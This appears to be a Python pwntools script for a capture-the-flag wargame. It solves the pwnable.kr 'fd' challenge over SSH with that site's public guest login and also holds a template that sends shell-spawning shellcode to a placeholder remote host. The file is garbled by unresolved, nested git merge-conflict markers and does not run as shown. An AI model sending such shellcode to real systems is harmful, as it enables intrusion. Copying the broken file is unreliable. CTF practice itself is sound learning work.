<<<<<<< HEAD
<<<<<<< HEAD
# from pwn import *
# context(arch = 'i386', os = 'linux')

# r = remote('exploitme.example.com', 31337)
# # EXPLOIT CODE GOES HERE
# r.send(asm(shellcraft.sh()))
# r.interactive()
from pwn import *
#context.log_level = 'debug'

pwn_ssh = ssh(host='pwnable.kr',user='fd',password='guest',port=2222)

cn = pwn_ssh.process(argv=['fd','4660'],executable='./fd')

cn.sendline('LETMEWIN')
print cn.recv()
=======
=======
>>>>>>> 70793d107f1b14877b26a9b8667c02a40ea4d03c
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('exploitme.example.com', 31337)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
<<<<<<< HEAD
r.interactive()
>>>>>>> 70793d107f1b14877b26a9b8667c02a40ea4d03c
=======
r.interactive()
>>>>>>> 70793d107f1b14877b26a9b8667c02a40ea4d03c
